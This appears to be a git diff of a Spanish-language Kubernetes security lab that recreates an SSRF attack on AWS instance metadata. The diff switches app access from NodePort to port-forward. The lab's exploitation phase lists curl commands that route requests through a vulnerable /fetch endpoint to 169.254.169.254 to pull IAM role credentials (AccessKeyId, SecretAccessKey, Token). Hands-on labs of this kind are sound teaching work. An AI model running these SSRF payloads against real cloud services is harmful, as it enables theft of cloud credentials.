@@ -14,7 +14,7 @@ En julio de 2019, una ex-empleada de AWS explotó una vulnerabilidad SSRF en un 
 
 | Archivo | Descripción |
 |---------|-------------|
-| `vulnerable.yaml` | App Flask con SSRF, sin NetworkPolicy (puede alcanzar IMDS) |
+| `vulnerable.yaml` | App Python con SSRF, sin NetworkPolicy (puede alcanzar IMDS) |
 
 ---
 
@@ -23,7 +23,7 @@ En julio de 2019, una ex-empleada de AWS explotó una vulnerabilidad SSRF en un 
 ```bash
 kubectl apply -f vulnerable.yaml
 kubectl get pods -n lab1-ssrf -w
-# Esperar a que esté Running (puede tardar ~30s por pip install)
+# Esperar a que esté Running
 ```
 
 ## Fase 2: Explotación SSRF
@@ -31,12 +31,18 @@ kubectl get pods -n lab1-ssrf -w
 ### Paso 1: Acceder a la app
 
 ```bash
-# Obtener la IP del nodo
-kubectl get nodes -o wide
-# Usar la IP INTERNAL del nodo
+# Verificar que el pod esté Running
+kubectl get pods -n lab1-ssrf
 
-# Acceder a la app via NodePort
-# http://<NODE-IP>:31082
+# Verificar el servicio
+kubectl get svc ssrf-app-svc -n lab1-ssrf
+
+# Exponer el servicio en localhost usando port-forward
+kubectl port-forward svc/ssrf-app-svc 8080:8080 -n lab1-ssrf &
+
+# Verificar que la app responde
+curl http://localhost:8080
+# Debe mostrar la página "URL Fetcher Service"
 ```
 
 ### Paso 2: Probar SSRF al IMDS (AWS)
@@ -45,13 +51,13 @@ kubectl get nodes -o wide
 # Desde el navegador o curl:
 
 # Listar metadata disponible
-curl "http://<NODE-IP>:31082/fetch?url=http://169.254.169.254/latest/meta-data/"
+curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/"
 
 # Obtener el IAM role del nodo
-curl "http://<NODE-IP>:31082/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 
 # Robar credenciales temporales
-curl "http://<NODE-IP>:31082/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>"
+curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>"
 # → AccessKeyId, SecretAccessKey, Token
 ```
 
